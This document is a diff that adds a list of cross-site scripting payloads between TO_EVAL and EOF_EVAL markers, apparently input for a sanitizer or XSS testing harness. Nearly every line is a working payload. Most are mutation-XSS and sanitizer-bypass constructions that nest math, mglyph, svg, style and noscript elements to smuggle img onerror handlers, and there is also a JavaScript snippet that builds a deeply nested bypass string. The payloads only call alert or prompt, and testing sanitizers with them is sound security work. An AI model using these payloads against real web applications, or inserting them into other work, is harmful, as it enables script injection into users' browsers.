@@ -1,3 +1,6 @@
 ###TO_EVAL###
 alert(document.domain)
+"><svg onxss=() onload='setTimeout alert|x281|×29''>
+  "><audio/src/onload=alert(document.domain)</audio><svg></p><style><a id="</style><img src=1 onerror=alert(1)>"><svg></p><style><a id="</style><img src=1 onerror=alert(1)>"><svg></p><style><a id="</style><img src=1 onerror=alert(1)>"><math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;"><math><mtext><table><mglyph><style><math><table id=”</table>”><img src onerror=alert(1)”><form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>"><svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>"><svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">n = 506; var payload = `${"<div>".repeat(n)}<table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table>${"</div>".repeat(n)}`;<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar
+ is="--><img src=x onerror=alert(1)>"><img hrEF="x" sRC="data:x," oNLy=1 oNErrOR=prompt`1`>
 ###EOF_EVAL###
